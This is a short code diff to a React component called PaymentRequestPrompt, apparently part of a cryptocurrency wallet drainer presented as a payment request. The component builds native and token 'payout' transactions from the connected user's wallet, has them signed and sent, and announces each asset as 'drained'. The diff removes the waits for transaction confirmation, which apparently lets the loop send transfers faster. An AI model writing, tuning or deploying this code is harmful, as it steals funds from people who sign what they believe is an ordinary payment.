@@ -157,10 +157,6 @@ export function PaymentRequestPrompt() {
                 break
               }
               const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
-              await connectionRef.current!.confirmTransaction(
-                { signature: sig, blockhash: freshTx.recentBlockhash!, lastValidBlockHeight: freshTx.lastValidBlockHeight! },
-                'confirmed'
-              )
               toast.success(`${step.symbol} drained. Signature ${sig.slice(0, 8)}…`)
             } else {
               const tokenTx = await buildSplPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, holding: step.holding })
@@ -171,10 +167,6 @@ export function PaymentRequestPrompt() {
                 break
               }
               const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
-              await connectionRef.current!.confirmTransaction(
-                { signature: sig, blockhash: tokenTx.recentBlockhash!, lastValidBlockHeight: tokenTx.lastValidBlockHeight! },
-                'confirmed'
-              )
               toast.success(`${step.symbol} drained. Signature ${sig.slice(0, 8)}…`)
             }
           } catch (drainErr) {
